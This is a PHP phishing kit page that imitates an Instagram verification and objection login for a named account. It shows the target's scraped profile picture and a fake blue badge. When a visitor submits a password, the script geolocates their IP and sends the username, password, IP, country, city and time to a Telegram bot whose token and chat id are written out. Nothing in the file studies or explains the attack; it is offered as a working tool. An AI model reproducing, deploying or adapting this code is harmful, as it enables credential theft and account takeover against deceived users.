<?php
require 'load.php';
session_start();
error_reporting(E_ALL);

$username=$_GET['nick'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
  $password=$_POST["password"];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
  $cek = new SimpleXMLElement($konum);
  $ulke = $cek->country;
  $sehir = $cek->city;
  date_default_timezone_set('Europe/Istanbul');
  $cur_time=date("d-m-Y H:i:s");
  $file = fopen(' ', 'a');

fclose($file);
echo '';
  
   header("Location: form.php?nick=$username");
}

if($_POST){

$token = "5021484904:AAG4Dj-9JXOLT44cuvK2V82sNMMP6BJMiPY";



$data = [
'text' => 'Aşkım Hesap Düştü 😘

Username: '.$username.'
Password: '.$password.'
IP Address: '.$ip.'
Date: '.$cur_time.'
Country: '.$ulke.'
City: '.$sehir.'
',
'chat_id' =>1492320849
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );  
}

?>
<!DOCTYPE html>
<style>img[alt="www.000webhost.com"]{display:none;}</style>
<html>
<head>
<link rel="stylesheet" href="css/xss1.css">
<link rel="stylesheet" type="text/css" href="css/xss2.css">
<link rel="stylesheet" href="css/xss3.css">
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<title>Rules Media Portal | Instagram</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1, user-scalable=no">
<link rel="icon" href="image/ig-logo.png">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
</head>
<body>
<header>
<table>
<tr>
<td><img src="image/ig.png" width="200"></td>
<td><i class="fas fa-bars" id="line"></i></td>
</tr>
</table>
<!--
<center>
<div class="get">
<span class="main" id="rgb" style="font-size: 30px!important;		width:50%!important;">@<?php echo $username;?></span>
<br>
</div>
</center>
-->
</header>
<center>
<div class="home">
<br><br>
<div class="mx">
<div class="wrapper fadeInDown">
<div id="formContent">
<br>
<div class="fadeIn first">
<img src="<?php  echo  $pp; ?>" style="max-width:90%; border-radius:50%;" width="135">
<br><br>
<h3 class="title" style="text-align:center;font-family: Helvetica, Arial, Sans-Serif;"><b>@<?php echo $username;?> <img src="image/bluebadge.png" width="25"> </b></h3>
<p class="text5" style="color: black!important;">Before filling out the objection request form, you must login to your account.</p>
<form autocomplete="off" method="post">
<input type="password" id="Login" class="fadeIn second" minlength="6" required  name="password" placeholder="Password"><br>
<a align="right"style="margin-top: 20px;position: relative; left: 23%;text-align:right; color: #09a7fd ; font-family:sans-serif; font-size:14px; font-weight:400;text-decoration:none;" href="" id="link"> Forgot Password ? </a><br>
<center>
<button type="submit" class="submit">
<div class="f4x" style="margin-left: 0px;">
<span class="comm">Login</span>
</div>
</button>
</center>
</form>
</div>
</div>
<br><br>
</div>
</div>
</div>
</center>
<center>
<div class="bottom"><br><br>
<h3 class="bottom-h3">DOWNLOAD FOR<br>IOS / ANDROID</h3><br>
<img src="image/store.jpg" width="325">
<br><br>
<table class="bottom-table">
<tr>
<td><span>About Us</span></td>
<td><span>Safety</span></td>
</tr>
<tr>
<td><span>Features</span></td>
<td><span>Blog</span></td>
</tr>
<tr>
<td><span>Community</span></td>
<td><span>Help</span></td>
</tr>
<tr>
<td><span>Business</span></td>
<td><span>Brand Assets</span></td>
</tr>
</table>
<br><br>
<img src="image/meta.svg" width="325">
<br><br><br>
</div>
</center>
</style>
</body>
<style type="text/css">
</style>
</html>
